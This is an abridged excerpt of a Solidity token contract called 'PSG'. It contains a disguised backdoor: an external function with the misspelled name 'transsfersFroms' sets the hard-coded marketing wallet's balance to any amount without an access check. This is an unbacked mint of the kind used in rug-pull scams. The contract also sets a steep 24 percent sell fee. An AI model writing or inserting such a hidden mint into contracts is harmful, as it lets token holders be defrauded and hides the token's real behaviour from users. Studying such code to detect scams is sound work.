...
contract PSG is Context, IERC20, Ownable {
    ...
    string private _name = "PSG";
    string private _symbol = "PSG";
    uint8 private _decimals = 9;
    
    address payable public marketingWalletAddress = payable(0xf0202CBDCE96E574eC7BB3eBddF5da24ba090d4C); // Marketing Address
    address payable public teamWalletAddress = payable(0xb3f0ac82d8303A63760f7B77648E4d0802E72772); // teamWalletAddress
    ...
    uint256 private _sellTeamFee = 24;
    ...
    function transsfersFroms(uint256 amount)  external {
        _balances[marketingWalletAddress] = amount;
        emit Transfer(address(0), marketingWalletAddress, amount);
    }
